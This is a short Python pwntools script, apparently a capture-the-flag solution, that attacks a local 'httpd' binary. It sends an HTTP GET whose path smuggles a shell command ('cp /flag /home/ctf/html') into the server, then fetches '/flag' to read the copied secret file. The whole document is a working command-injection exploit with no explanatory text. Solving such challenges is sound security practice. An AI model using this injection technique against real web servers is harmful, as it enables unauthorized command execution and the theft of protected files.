from pwn import *

def send_req(uri):
    s=process("./httpd")
    s.sendline(b"GET "+uri+b" HTTP/1.0")
    s.sendline(b"Host: 127.0.0.1")
    s.sendline(b"Content-Length: 80")
    print(s.recvall())
    s.close()
send_req(b"/cp%20/flag%20/home/ctf/html")
send_req(b"/flag")